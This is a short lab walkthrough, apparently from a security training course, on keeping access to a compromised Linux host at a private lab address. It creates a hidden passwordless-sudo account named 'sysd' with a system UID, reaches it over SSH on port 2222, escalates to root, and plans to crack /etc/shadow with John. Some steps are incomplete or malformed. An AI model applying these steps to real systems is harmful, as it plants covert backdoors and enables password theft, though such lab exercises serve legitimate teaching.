**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - sudo adduser sysd

2. Give your secret user a password: 
    - sudo passwd sysd

3. Give your secret user a system UID < 1000:
    - sudo usermod -u 100 sysd

4. Give your secret user the same GID:
   - sudo groupmod -g 100 sysd

5. Give your secret user full `sudo` access without the need for a password:
   -  sudo visudo

6. Test that `sudo` access works without your password:

    ```bash
    sudo ls
    ```

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    ```bash
    nano /etc/ssh/sshd_config

    ```

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    - service ssh restart

2. Exit the `root` account:
    - logout

3. SSH to the target machine using your `sysd` account and port `2222`:
    - ssh sysd@192.168.6.105 -p 2222

4. Use `sudo` to switch to the root user:
    - sudo -s

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - ssh sysd@192.168.6.105 -p 2222

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    - sudo -su
